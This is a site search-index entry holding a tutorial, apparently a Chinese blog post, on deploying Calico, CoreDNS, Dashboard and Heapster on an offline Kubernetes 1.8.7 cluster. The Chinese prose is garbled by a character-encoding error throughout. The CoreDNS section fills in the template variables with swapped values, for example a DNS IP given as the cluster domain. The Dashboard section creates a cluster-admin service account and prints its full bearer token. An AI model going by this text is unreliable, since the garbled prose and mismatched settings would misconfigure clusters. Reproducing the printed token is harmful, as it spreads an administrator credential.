<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[kubernetes 1.8.7 ç¦»çº¿éƒ¨ç½²æ‰‹å†Œ(äºŒ)]]></title>
    <url>%2F2018%2F01%2F27%2Fkubernetes-binary-install-2%2F</url>
    <content type="text"><![CDATA[è¿™æ˜¯kubernetesé›†ç¾¤éƒ¨ç½²çš„ç¬¬äºŒéƒ¨åˆ†, åœ¨ä¸Šç¯‡ä¸­æˆ‘ä»¬éƒ¨ç½²äº†ä¸€ä¸ªçš„kubernetesé›†ç¾¤(4ä¸ªnodeèŠ‚ç‚¹), æ¥ä¸‹æ¥æˆ‘ä»¬å°†éƒ¨ç½²ä¸€äº›å¾ˆå®ç”¨çš„kubernetesæ‰©å±•æ’ä»¶, åŒ…æ‹¬é›†ç¾¤ç½‘ç»œ, å¯è§†åŒ–, æœåŠ¡å‘ç°, é›†ç¾¤ç›‘æ§ã€‚ æ’ä»¶é•œåƒå‡†å¤‡kubernetesæä¾›è¯¸å¤šä½¿ç”¨çš„é›†ç¾¤æ’ä»¶: æ’ä»¶åˆ—è¡¨, ä¸‹é¢æˆ‘ä»¬é€‰å–å¦‚ä¸‹4ä¸ªè¿›è¡Œå®‰è£…: Calico: å®‰å…¨çš„L3ç½‘ç»œå’Œç½‘ç»œç­–ç•¥æ’ä»¶,é€šè¿‡CNIä¸ºæ•´ä½“é›†ç¾¤çš„ç½‘ç»œæ‰“é€šã€‚ CoreDNS: ä¸ºé›†ç¾¤æä¾›DNSæœåŠ¡, ç”¨äºæœåŠ¡å‘ç°(CoreDNS, å°±æ˜¯ä¸ºäº†æ›¿æ¢kube-dnsçš„) Dashboard: ä¸ºç”¨æˆ·æä¾›Web UIã€‚ Heapster: é›†ç¾¤çš„ç›‘æ§æ’ä»¶, åŒæ—¶ä¹Ÿä¸º HPAæä¾›æŒ‡æ ‡ã€‚ ä»¥ä¸‹æ˜¯æŒ‰ç…§ä»¥ä¸Šæ’ä»¶éœ€è¦çš„é•œåƒ:123456789101112# calicoä¾èµ–é•œåƒquay.io/calico/node:v2.6.7quay.io/calico/cni:v1.11.2quay.io/calico/kube-controllers:v1.0.3# corednsä¾èµ–é•œåƒcoredns/coredns:1.0.4# dashboardä¾èµ–é•œåƒk8s.gcr.io/kubernetes-dashboard-amd64:v1.8.2# heapsterä¾èµ–é•œåƒk8s.gcr.io/heapster-amd64:v1.5.0k8s.gcr.io/heapster-grafana-amd64:v4.4.3k8s.gcr.io/heapster-influxdb-amd64:v1.3.3 è¿™äº›é•œåƒæœ€åä¼šæŠŠpushåˆ°æˆ‘ä»¬è‡ªå·±çš„ç§æœ‰ä»“åº“, å¦‚æœä½ è¿˜æ²¡å®‰è£…ç§æœ‰ä»“åº“è¯·ç§»æ­¥: ä¼ä¸šçº§Dockeré•œåƒä»“åº“harborçš„éƒ¨ç½²å’Œä½¿ç”¨ å¦‚æœè‡ªå·±èƒ½ç¿»å¢™,è‡ªå·±ä¸‹è½½æ¨é€åˆ°è‡ªå·±çš„ç§æœ‰ä»“åº“, å¦‚æœå‡ºä¸å», è¯·çœ‹è¿™é‡Œ: ç™¾åº¦ç½‘ç›˜kubernetes-addsæ’ä»¶image åŠ è½½ä¸‹è½½çš„é•œåƒåˆ°æœ¬åœ°12345678docker load &lt; calico-node.tardocker load &lt; calico-cni.tardocker load &lt; calico-kube-controller.tardocker load &lt; coredns.tardocker load &lt; dashboard.tardocker load &lt; heapster.tardocker load &lt; heapster-grafana.tardocker load &lt; heapster-influxdb.tar æ¨é€åˆ°ç§æœ‰ä»“åº“æˆ‘ç§æœ‰ä»“åº“ä½¿ç”¨çš„æ˜¯harbor, å¹¶ä¸”å·²ç»åˆ›å»ºäº†1ä¸ªkubernetesçš„é¡¹ç›®, ä¸‹é¢çš„æ“ä½œè¯·æ›´æ¢æˆä½ è‡ªå·±çš„ä»“åº“åœ°å€å’Œé¡¹ç›®12345# corednsdocker tag coredns/coredns:1.0.4 192.168.204.15/kubernetes/coredns:1.0.4docker push 192.168.204.15/kubernetes/coredns:1.0.4# calico... ç½‘ç»œæ’ä»¶-CalicoCalicoæ˜¯ä¸€æ¬¾çº¯Layer 3çš„æ•°æ®ä¸­å¿ƒç½‘ç»œæ–¹æ¡ˆ(ä¸éœ€è¦Overlayç½‘ç»œ), Calicoå¥½å¤„æ˜¯ä»–å·²ä¸å„ç§äº‘åŸç”Ÿå¹³å°æœ‰è‰¯å¥½çš„æ•´åˆ, è€ŒCalicoåœ¨æ¯ä¸€ä¸ªèŠ‚ç‚¹åˆ©ç”¨Linux Kernelå®ç°é«˜æ•ˆçš„vRouteræ¥è´Ÿè´£æ•°æ®çš„è½¬å‘ï¼Œè€Œå½“æ•°æ®ä¸­å¿ƒå¤æ‚åº¦å¢åŠ æ—¶ï¼Œå¯ä»¥ç”¨BGP route reflectoræ¥è¾¾æˆ, æ˜¯æ€§èƒ½æœ€å¥½çš„ç½‘ç»œè§£å†³æ–¹æ¡ˆä¹‹ä¸€ã€‚Calicoè¿˜æœ‰ä¸€å¤§ä¼˜åŠ¿ï¼šnetwork policyã€‚ç”¨æˆ·å¯ä»¥åŠ¨æ€å®šä¹‰ACLè§„åˆ™ï¼Œæ§åˆ¶è¿›å‡ºå®¹å™¨çš„æ•°æ®åŒ…ï¼Œå®ç°ä¸šåŠ¡éœ€æ±‚, æ¯”å¦‚ç§Ÿæˆ·éš”ç¦»ã€‚æœ€æ–°ç‰ˆæœ¬çš„calicoå·²ç»åˆ°3.0.1, 3.0æœ‰ä¸å…¼å®¹å˜æ›´, è¿›è¿‡å‡ å¤©çš„æŠ˜è…¾, é—®é¢˜å¾ˆå¤š, githubä¸ŠIssueå…³äº3.0å’Œk8sçš„é—®é¢˜è¿˜æœªå¾—åˆ°è§£å†³, æ‰€ä»¥æˆ‘ä»¬å®‰è£…2.xç‰ˆæœ¬çš„calicoã€‚ éƒ¨ç½²æ³¨æ„äº‹é¡¹åœ¨ä½¿ç”¨Calicoå‰å½“ç„¶æœ€å¥½æ’¸ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œåœ°å€åœ¨è¿™é‡ŒCalico å®˜æ–¹æ–‡æ¡£ï¼Œå…¶ä¸­éƒ¨ç½²å‰éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹: å®˜æ–¹æ–‡æ¡£ä¸­è¦æ±‚kubeleté…ç½®å¿…é¡»å¢åŠ  â€“network-plugin=cni é€‰é¡¹ calicoé‡‡ç”¨daemonSetéƒ¨ç½²æ—¶, kubeleté…ç½®å¿…é¡»å¢åŠ  â€“allow_privileged=true é€‰é¡¹ kube-proxyç»„ä»¶å¿…é¡»é‡‡ç”¨iptables proxy mode æ¨¡å¼(1.2 ä»¥åæ˜¯é»˜è®¤æ¨¡å¼) kubec-proxyç»„ä»¶ä¸èƒ½é‡‡ç”¨ â€“masquerade-all å¯åŠ¨ï¼Œå› ä¸ºä¼šä¸ Calico policy å†²çª NetworkPolicy API åªè¦éœ€è¦ Kubernetes 1.3 ä»¥ä¸Š å¯ç”¨RBACåéœ€è¦è®¾ç½®å¯¹åº”çš„ RoleBindingï¼Œå‚è€ƒå®˜æ–¹æ–‡æ¡£ RBAC éƒ¨åˆ† masterå®‰è£…calicoctlé¦–å…ˆéœ€è¦åœ¨masterèŠ‚ç‚¹å®‰è£…calicoçš„å®¢æˆ·ç«¯: calicoctl ç”¨äºç¨åæ£€æŸ¥calicoçš„ç½‘ç»œèŠ‚ç‚¹çŠ¶æ€, åˆ°calicoçš„Github Releaseä¸‹è½½2.6ç‰ˆæœ¬calicoå¯¹äºçš„CLI: calicoctl 1.6.31234wget https://github.com/projectcalico/calicoctl/releases/download/v1.6.3/calicoctlchmod +x calicoctlmv calicoctl /usr/local/bin/mkdir /etc/calico ç„¶åé…ç½®å®¢æˆ·ç«¯: /etc/calico/calicoctl.cfg:123456789apiVersion: v1kind: calicoApiConfigmetadata:spec: datastoreType: "etcdv2" etcdEndpoints: "https://192.168.204.3:2379" etcdKeyFile: "/etc/kubernetes/pki/kubernetes-key.pem" etcdCertFile: "/etc/kubernetes/pki/kubernetes.pem" etcdCACertFile: "/etc/kubernetes/pki/ca.pem" ç„¶åç­‰é›†ç¾¤å¯åŠ¨åæµ‹è¯•ã€‚ DaemonSetå®‰è£…calicoæ’ä»¶è¿™é‡Œé‡‡ç”¨calico standard hosted install, ä½¿ç”¨2.6çš„å®‰è£…è¯´æ˜:123mkdir calico &amp;&amp; cd calicowget https://docs.projectcalico.org/v2.6/getting-started/kubernetes/installation/hosted/calico.yamlwget https://docs.projectcalico.org/v2.6/getting-started/kubernetes/installation/rbac.yaml rbacæ–‡ä»¶æ²¡æœ‰éœ€è¦è°ƒæ•´çš„, è€Œcalicoéœ€è¦é…ç½®ETCDçš„ç›¸å…³å‚æ•°, å› æ­¤ä¿®æ”¹calico.yamlå¦‚ä¸‹2ä¸ªéƒ¨åˆ†: æŒ‡å®šetcdçš„åœ°å€(ConfigMapä¸­): 1etcd_endpoints: "https://192.168.204.3:2379" æŒ‡å®šetcdçš„è¯ä¹¦(ConfigMapä¸­) 12345# If you&apos;re using TLS enabled etcd uncomment the following.# You must also populate the Secret below with these files.etcd_ca: &quot;/calico-secrets/etcd-ca&quot;etcd_cert: &quot;/calico-secrets/etcd-cert&quot;etcd_key: &quot;/calico-secrets/etcd-key&quot; æ·»åŠ base64ç¼–ç çš„è¯ä¹¦å†…å®¹(Secretä¸­): 1234567# Populate the following files with etcd TLS configuration if desired, but leave blank if# not using TLS for etcd.# This self-hosted install expects three files with the following names. The values# should be base64 encoded strings of the entire contents of each file.etcd-key: $(cat /etc/kubernetes/pki/kubernetes-key.pem | base64 | tr -d &apos;\n&apos;)etcd-cert: $(cat /etc/kubernetes/pki/kubernetes.pem | base64 | tr -d &apos;\n&apos;)etcd-ca: $(cat /etc/kubernetes/pki/ca.pem | base64 | tr -d &apos;\n&apos;) ä¿®æ”¹3ä¸ªimageä¸ºè‡ªå·±ç§æœ‰ä»“åº“çš„åœ°å€: 123quay.io/calico/node:v2.6.7 --&gt; 192.168.204.15/kubernetes/calico/node:v2.6.7quay.io/calico/cni:v1.11.2 --&gt; 192.168.204.15/kubernetes/calico/cni:v1.11.2quay.io/calico/kube-controllers:v1.0.3 --&gt; 192.168.204.15/kubernetes/calico/kube-controllers:v1.0.3 ç¡®è®¤kubeletæ˜¯å¦å¼€å¯daemonSetå…è®¸æƒé™ 12æŸ¥çœ‹æ‰€æœ‰nodeèŠ‚ç‚¹çš„kubeleté…ç½®æ–‡ä»¶æ˜¯å¦æ·»åŠ äº†è¯¥é€‰é¡¹: --allow_privileged=trueå¦‚æœæ²¡æ·»åŠ , æ·»åŠ ç„¶åé‡å¯kubelet æœ€åæ‰§è¡Œ: 123456789kubectl apply -f rbac.yamlkubectl create -f calico.yaml[root@k8s-apiserver01 calico]# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcalico-kube-controllers-76ddc77958-pc7t2 1/1 Running 1 1dcalico-node-4jr45 2/2 Running 2 1dcalico-node-5cvkj 2/2 Running 0 1hcalico-node-sllgc 2/2 Running 0 1dcalico-node-xwf7g 2/2 Running 2 1d æ£€æŸ¥ç½‘ç»œæ˜¯å¦okç°åœ¨æˆ‘ä»¬4ä¸ªnodeèŠ‚ç‚¹å·²ç»ç»„æˆäº†ä¸€ä¸ªbgpçš„ç½‘ç»œ, å…ˆä½¿ç”¨calicoctlæ¥æ£€æŸ¥ä¸‹ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081[root@k8s-apiserver01 calico]# calicoctl get node -o wideNAME ASN IPV4 IPV6k8s-apiserver01 (64512) 192.168.204.3/24k8s-node01 (64512) 192.168.204.4/24k8s-node02 (64512) 192.168.204.6/24k8s-node03 (64512) 192.168.204.7/24# çœ‹å…¶ä»–å‡ ä¸ªèŠ‚ç‚¹æ˜¯å¦æ­£å¸¸[root@k8s-apiserver01 calico]# calicoctl node statusCalico process is running.IPv4 BGP status+---------------+-------------------+-------+----------+-------------+| PEER ADDRESS | PEER TYPE | STATE | SINCE | INFO |+---------------+-------------------+-------+----------+-------------+| 192.168.204.4 | node-to-node mesh | up | 06:55:36 | Established || 192.168.204.6 | node-to-node mesh | up | 06:55:33 | Established || 192.168.204.7 | node-to-node mesh | up | 06:55:35 | Established |+---------------+-------------------+-------+----------+-------------+# ç„¶åæˆ‘ä»¬è¿è¡Œå‡ ä¸ªpod, æµ‹è¯•ä¸åŒnodeä¸Šçš„å®¹å™¨æ˜¯å¦èƒ½æ­£å¸¸é€šä¿¡[root@k8s-apiserver01 calico]# cat demo.deploy.yamlapiVersion: apps/v1beta2kind: Deploymentmetadata: name: demo-deploymentspec: replicas: 5 selector: matchLabels: app: demo template: metadata: labels: app: demo spec: containers: - name: demo image: mritd/demo imagePullPolicy: IfNotPresent ports: - containerPort: 80[root@k8s-apiserver01 calico]# kubectl create -f demo.deploy.yamlcreated "demo-deployment" deployment[root@k8s-apiserver01 calico]# kubectl get podsNAME READY STATUS RESTARTS AGEdemo-deployment-6969c5cb49-7t8nm 1/1 Running 0 1ddemo-deployment-6969c5cb49-phxvz 1/1 Running 0 1ddemo-deployment-6969c5cb49-v2sqs 1/1 Running 0 1ddemo-deployment-6969c5cb49-z2zvf 1/1 Running 0 1ddemo-deployment-6969c5cb49-zzjnf 1/1 Running 0 1d# è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åˆ°node01å’Œnode2ä¸Šé¢çœ‹çœ‹æ˜¯å¦æœ‰è¿è¡Œçš„demo# node1ä¸Šé¢çš„nginx[root@k8s-node01 ~]# docker exec -it 21690463cb6f ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN qlen 1 link/ipip 0.0.0.0 brd 0.0.0.04: eth0@if44: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP link/ether 52:02:5e:94:d3:8f brd ff:ff:ff:ff:ff:ff inet 192.168.85.200/32 scope global eth0 valid_lft forever preferred_lft forever# node2ä¸Šçš„nginx[root@k8s-node02 ~]# docker exec -it 7bdeea5b982f ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever2: tunl0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop state DOWN qlen 1 link/ipip 0.0.0.0 brd 0.0.0.04: eth0@if14: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP link/ether 0a:6d:c6:8b:62:fd brd ff:ff:ff:ff:ff:ff inet 192.168.58.202/32 scope global eth0 valid_lft forever preferred_lft forever# node2 ping node1[root@k8s-node02 ~]# docker exec -it 7bdeea5b982f ping 192.168.85.200PING 192.168.85.200 (192.168.85.200): 56 data bytes64 bytes from 192.168.85.200: seq=0 ttl=62 time=10.161 ms64 bytes from 192.168.85.200: seq=1 ttl=62 time=1.481 ms64 bytes from 192.168.85.200: seq=2 ttl=62 time=1.203 ms64 bytes from 192.168.85.200: seq=3 ttl=62 time=3.483 ms# ç½‘ç»œæ’ä»¶éƒ¨ç½²æˆåŠŸã€‚ é…ç½®kubeletå¯ç”¨CNIåœ¨æ‰€æœ‰èŠ‚ç‚¹çš„kubeletçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ : â€“network-plugin=cni é€‰é¡¹ç„¶åé‡å¯æ‰€æœ‰kubeletèŠ‚ç‚¹, çŸ¥é“æ‰€æœ‰çš„nodeèŠ‚ç‚¹çŠ¶æ€æ¢å¤ä¸ºReady, æ‰ä»£è¡¨CNIæ’ä»¶éƒ¨ç½²æˆåŠŸ, NodeèŠ‚ç‚¹å‡†å¤‡å°±ç»ªã€‚ 123456[root@k8s-apiserver01 ~]# kubectl get nodesNAME STATUS ROLES AGE VERSION192.168.204.3 Ready &lt;none&gt; 1d v1.8.7192.168.204.4 Ready &lt;none&gt; 4d v1.8.7192.168.204.6 Ready &lt;none&gt; 4d v1.8.7192.168.204.7 Ready &lt;none&gt; 4d v1.8.7 æœåŠ¡å‘ç°æ’ä»¶-CoreDNScoreDNSæ˜¯kubeDNSçš„æ›¿ä»£é¡¹ç›®, è€Œä¸”ç¨³å®šæ€§ä¹Ÿæ¯”kubeDNSå¥½, å› æ­¤è¿™é‡Œä½¿ç”¨CoreDNS, è¯¥ç»„ä»¶å¿…é¡»éƒ¨ç½², å› ä¸ºåé¢å¾ˆå¤šæœåŠ¡éƒ½ä¾èµ–å®ƒè¿›è¡ŒæœåŠ¡åç§°çš„åœ°å€è§£æ(æ¯”å¦‚åé¢å³å°†éƒ¨ç½²çš„Dashboard) éƒ¨ç½²CoreDNSä¸‹é¢æ˜¯å®˜æ–¹æä¾›çš„æ¨¡æ¿(å®˜æ–¹éƒ¨ç½²æ–‡æ¡£coreDNS deploy):123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152apiVersion: v1kind: ServiceAccountmetadata: name: coredns namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRolemetadata: labels: kubernetes.io/bootstrapping: rbac-defaults name: system:corednsrules:- apiGroups: - "" resources: - endpoints - services - pods - namespaces verbs: - list - watch---apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRoleBindingmetadata: annotations: rbac.authorization.kubernetes.io/autoupdate: "true" labels: kubernetes.io/bootstrapping: rbac-defaults name: system:corednsroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:corednssubjects:- kind: ServiceAccount name: coredns namespace: kube-system---apiVersion: v1kind: ConfigMapmetadata: name: coredns namespace: kube-systemdata: Corefile: | .:53 &#123; errors health kubernetes CLUSTER_DOMAIN REVERSE_CIDRS &#123; pods insecure upstream /etc/resolv.conf fallthrough in-addr.arpa ip6.arpa &#125; prometheus :9153 proxy . /etc/resolv.conf cache 30 &#125;---apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: coredns namespace: kube-system labels: k8s-app: coredns kubernetes.io/name: "CoreDNS"spec: replicas: 2 strategy: type: RollingUpdate rollingUpdate: maxUnavailable: 1 selector: matchLabels: k8s-app: coredns template: metadata: labels: k8s-app: coredns spec: serviceAccountName: coredns tolerations: - key: "CriticalAddonsOnly" operator: "Exists" affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: k8s-app operator: In values: - coredns topologyKey: kubernetes.io/hostname containers: - name: coredns image: coredns/coredns:1.0.4 imagePullPolicy: IfNotPresent args: [ "-conf", "/etc/coredns/Corefile" ] volumeMounts: - name: config-volume mountPath: /etc/coredns ports: - containerPort: 53 name: dns protocol: UDP - containerPort: 53 name: dns-tcp protocol: TCP livenessProbe: httpGet: path: /health port: 8080 scheme: HTTP initialDelaySeconds: 60 timeoutSeconds: 5 successThreshold: 1 failureThreshold: 5 dnsPolicy: Default volumes: - name: config-volume configMap: name: coredns items: - key: Corefile path: Corefile---apiVersion: v1kind: Servicemetadata: name: kube-dns namespace: kube-system labels: k8s-app: coredns kubernetes.io/cluster-service: "true" kubernetes.io/name: "CoreDNS"spec: selector: k8s-app: coredns clusterIP: CLUSTER_DNS_IP ports: - name: dns port: 53 protocol: UDP - name: dns-tcp port: 53 protocol: TCP ä¿®æ”¹æ¨¡æ¿ä¸­çš„å˜é‡:123CLUSTER_DOMAIN: è¿™ä¸ªåœ¨nodeèŠ‚ç‚¹éƒ¨ç½²çš„æ—¶å€™å·²ç»æå‰æŒ‡å®šä¸º(--cluster-dns=10.254.0.2), å› æ­¤è¿™é‡Œå’ŒnodeèŠ‚ç‚¹æŒ‡å®šä¿æŒä¸€è‡´, ä¿®æ”¹æˆ 10.254.0.2 REVERSE_CIDRS: cluster.localCLUSTER_DNS_IP: in-addr.arpa ip6.arpa ä¿®æ”¹è¿‡åçš„å…·ä½“æ–‡ä»¶è¯·å‚è€ƒcoredns.yaml è¿è¡Œ:1kubectl create -f coredns.yaml æµ‹è¯•DNSæ˜¯å¦æ­£å¸¸åˆ›å»ºä¸€ä¸ªbusyboxçš„å®¹å™¨, ç„¶åå°è¯•è§£æå†…éƒ¨apiserveræœåŠ¡çš„åœ°å€:1234567891011121314151617181920212223242526[root@k8s-apiserver01 apps]# cat pod-busybox.yamlapiVersion: v1kind: Podmetadata: name: busybox namespace: defaultspec: containers: - image: busybox command: - sleep - "3600" imagePullPolicy: IfNotPresent name: busybox restartPolicy: Always[root@k8s-apiserver01 apps]# kubectl create -f pod-busybox.yamlpod "busybox" created[root@k8s-apiserver01 apps]# kubectl exec -it busybox /bin/sh/ # nslookup kubernetes.defaultServer: 10.254.0.2Address 1: 10.254.0.2 kube-dns.kube-system.svc.cluster.localName: kubernetes.defaultAddress 1: 10.254.0.1 kubernetes.default.svc.cluster.local[root@k8s-apiserver01 apps]# kubectl delete -f pod-busybox.yamlpod "busybox" deleted ç”±äºå¯ä»¥çœ‹å‡ºå†…éƒ¨DNSå·²ç»ç”Ÿæ•ˆ. å¯è§†åŒ–æ’ä»¶-Dashboraddashboradæ˜¯é›†ç¾¤çš„å¯è§†åŒ–æ’ä»¶, æœ€æ–°ç‰ˆæœ¬(1.8.2)å·²ç»æ”¯æŒé€šè¿‡webè¿›å…¥å®¹å™¨å†…éƒ¨è¿›è¡Œæ“ä½œ, å› æ­¤å‡ ä¹ä¸€åˆ‡éœ€æ±‚éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªWeb UIæ¥ä¸kubernetesé›†ç¾¤è¿›è¡Œäº¤äº’æ¥å®Œæˆã€‚ä¸ºäº†å¢åŠ dashboardçš„å®‰å…¨æ€§, ä»1.7è¿‡å, ashboardé»˜è®¤å°†é‡‡ç”¨æœ€å°æƒé™å®‰è£…(åŸºäºrabcçš„kubernetesè®¿é—®çš„æœ€å°æƒé™), å¹¶ä¸”é€šè¿‡httpsè®¿é—®ã€‚ æˆ‘ä»¬ä½¿ç”¨å®˜æ–¹çš„é…ç½®æ–‡ä»¶æ¥å®‰è£…ï¼Œé¦–å…ˆä¸‹è½½å®˜æ–¹é…ç½®:1wget https://raw.githubusercontent.com/kubernetes/dashboard/master/src/deploy/recommended/kubernetes-dashboard.yaml å°†é•œåƒåœ°å€: k8s.gcr.io/kubernetes-dashboard-amd64:v1.8.2 ä¿®æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„åœ°å€: 192.168.204.15/kubernetes/dashboard:v1.8.2 ç„¶ååˆ°masterèŠ‚ç‚¹ä¸Š åˆ›å»ºæˆ‘ä»¬çš„dashboardæ’ä»¶åº”ç”¨:12345678910[root@k8s-apiserver01 apps]# kubectl create -f kubernetes-dashboard.yamlsecret "kubernetes-dashboard-certs" createdserviceaccount "kubernetes-dashboard" createdrole "kubernetes-dashboard-minimal" createdrolebinding "kubernetes-dashboard-minimal" createddeployment "kubernetes-dashboard" createdservice "kubernetes-dashboard" created[root@k8s-apiserver01 apps]# kubectl -n kube-system get svc kubernetes-dashboardNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes-dashboard NodePort 10.254.75.168 &lt;none&gt; 443:32101/TCP 2m ç„¶åè®¿é—®å¯¹ç”¨çš„port dashboardçš„ç™»å½•æ”¯æŒkubeconfigå’Œtokenä¸¤ç§æ–¹å¼: kubeconfig: å’Œä¹‹å‰ç”Ÿæˆçš„kubeconfigæ–‡ä»¶ä¸€æ ·, ä½†æ˜¯å¤šäº†ä¸€ä¸ªtokenå­—æ®µ, è€Œä¸”æ˜¯å¿…éœ€çš„å‚æ•°, æ‰€æœ‰ä¹‹å‰CLIä½¿ç”¨çš„kubeconfigæ˜¯ç™»å½•ä¸äº†çš„, éœ€è¦ä¸ºä»–ç”Ÿæˆä¸€ä¸ªtoken token: æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç”¨æˆ·è·å–token å°±å¯èƒ½ç™»å½•, å½“ç„¶ä½ ä¹Ÿå¯ä»¥å°†æ­¤tokenåŠ å…¥åˆ°kubeconfigæ–‡ä»¶é‡Œé¢ä½¿ç”¨kubeconfigæ–‡ä»¶æ¥ç™»å½•ã€‚ ä¸‹é¢æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªadminç”¨æˆ·, ç„¶åèµ‹äºˆå®ƒcluster-adminè§’è‰², ä½¿å¾—å…¶æ‹¥æœ‰ç®¡ç†kubernetesé›†ç¾¤çš„æƒé™, æˆ‘ä»¬é€šè¿‡admin-role.yamlæ¥å®šä¹‰è¿™äº›æ“ä½œ, æ–‡ä»¶å†…å®¹å¦‚ä¸‹:1234567891011121314151617181920apiVersion: v1kind: ServiceAccountmetadata: name: admin-user namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1beta1kind: ClusterRoleBindingmetadata: name: admin-user annotations: rbac.authorization.kubernetes.io/autoupdate: "true"roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- kind: ServiceAccount name: admin-user namespace: kube-system åˆ›å»ºå¹¶è·å–token:1234567891011121314151617[root@k8s-apiserver01 apps]# kubectl create -f admin-role.yamlclusterrolebinding "admin" createdserviceaccount "admin" created[root@k8s-apiserver01 dashboard]# kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin | awk '&#123;print $1&#125;')Name: admin-token-2p7l7Namespace: kube-systemLabels: &lt;none&gt;Annotations: kubernetes.io/service-account.name=admin kubernetes.io/service-account.uid=c9aad066-fe8d-11e7-8479-fa163ee6f9f6Type: kubernetes.io/service-account-tokenData====namespace: 11 bytestoken: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycDdsNyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6ImM5YWFkMDY2LWZlOGQtMTFlNy04NDc5LWZhMTYzZWU2ZjlmNiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.dv9Rt6EA08KFvYDqHYJlHu188vwfPPxf8Yf0cOhHswOsGWhgsoq-UmugcKcq1nqiVEEXR_EXb657ftPrpKOJrt3pkS2__5FdI-h3D6mKj1-zFae-dj8y_tVi4oaHQExIoxgbrzvBVKTpNxDbzWPKf2CChzRPRWqMmAuPlxK8iSvOf11wGe5B_Fh3okObFk5p_CA1Iz9NFRfD3OSR1_9Bt13SfwdKC3oodVBjrrTB-4O00gYM1RHV54_UmhSVJJkZCfvGhfqVt0h0f1Jmihju_D1OyQY5Lp-LpHN0hP-a8TOidmjNYmy96euiZcDPhnb932GYaA2xVzgcIag72bIzbwca.crt: 1359 bytes ä½¿ç”¨è·å–åçš„tokenè¿›è¡Œç™»å½• é›†ç¾¤ç›‘æ§æ’ä»¶-HeapsterHeapsteræ˜¯kubernetesçš„é›†ç¾¤ç›‘æ§æ–¹æ¡ˆ, ä»¥ä¸‹æ˜¯heapsterçš„æ¶æ„: è¿™æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç»„ä»¶, ä»–å½±å“åˆ°ä»¥ä¸‹å‡ ä¸ªkubernetesç»„ä»¶: dashboard: ä¾èµ–heapsterè·å–ä¸€äº›æŒ‡æ ‡æ•°æ®, ç­‰heapsteræˆåŠŸéƒ¨ç½²å, dashbaordä¸Šä¹Ÿä¼šè¿›è¡Œè¿™äº›æŒ‡æ ‡çš„å±•ç¤ºã€‚ kubectl topå‘½ä»¤: ä¾èµ–heapsteræä¾›metricæ•°æ®ã€‚ hpa: kubernetesæ”¯æŒåº”ç”¨çš„æ°´å¹³ä¼¸ç¼©, ä½†æ˜¯åŒæ ·ä¾èµ–heapsteræä¾›çš„metricæ•°æ®ã€‚ ä¸‹é¢å°†éƒ¨ç½²ä¸€å¥—backend ä¸ºinfluxdb, åŒæ—¶æ”¯æŒgrafanaä¸ºdashboardçš„heapster, ç”±äºè¯¥ç»„ä»¶éœ€è¦å¤šä¸ªpodåä½œ, å¹¶ä¸”éƒ¨ç½²æ—¶ä½¿ç”¨äº†åç§°è§£ææœåŠ¡, æ‰€ä»¥ä¸€å®šè¦ç¡®ä¿: calicoå’ŒcoreDNSéƒ¨ç½²æˆåŠŸæ‰èƒ½å¼€å§‹éƒ¨ç½²è¯¥ç»„ä»¶ã€‚ éƒ¨ç½²heapserè¦éƒ¨ç½²heapsteréœ€è¦ä¸‹é¢è¿™äº›æ–‡ä»¶: ä»¥influxdbä¸ºåç«¯éƒ¨ç½²heapsterçš„æ–‡ä»¶ rbacæ–‡ä»¶ 